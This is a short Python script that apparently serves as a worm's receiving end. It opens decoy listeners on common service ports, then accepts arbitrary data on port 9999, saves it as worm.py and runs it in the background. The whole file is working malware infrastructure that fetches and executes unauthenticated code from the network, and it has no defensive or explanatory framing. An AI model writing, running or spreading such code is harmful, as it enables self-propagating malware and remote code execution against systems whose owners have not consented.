import socket
import threading
import os

def open_port(port):
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", port))
    s.listen(5)
    while True:
        conn, _ = s.accept()
        conn.close()

def receive_worm():
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", 9999))
    s.listen(5)
    while True:
        conn, _ = s.accept()
        data = b""
        while True:
            chunk = conn.recv(4096)
            if not chunk:
                break
            data += chunk
        conn.close()
        with open("worm.py", "wb") as f:
            f.write(data)
        os.system("python3 worm.py &")

for port in [21, 22, 80, 443, 3306, 8080]:
    threading.Thread(target=open_port, args=(port,), daemon=True).start()

receive_worm()
